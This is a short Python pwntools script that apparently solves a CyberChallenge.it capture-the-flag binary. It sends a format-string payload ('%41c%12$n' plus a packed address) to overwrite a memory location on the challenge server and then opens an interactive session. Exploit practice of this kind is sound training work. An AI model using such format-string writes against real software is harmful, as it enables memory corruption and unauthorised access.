#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = 'error' # se non vuoi vedere i loggin

exe = context.binary = ELF(args.EXE or './the_answer')
lib = CDLL(exe.libc.path)
host = args.HOST or 'answer.challs.cyberchallenge.it'
port = int(args.PORT or 9122)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x4008d9
continue
'''.format(**locals())

# -- Exploit goes here --

# io = start()

# var = p64(0x601078)

i = 0

payload = b"A%41c%12$naaaaaa" + p64(0x601078)
io = start()
io.sendlineafter(b"?", payload)

io.interactive()

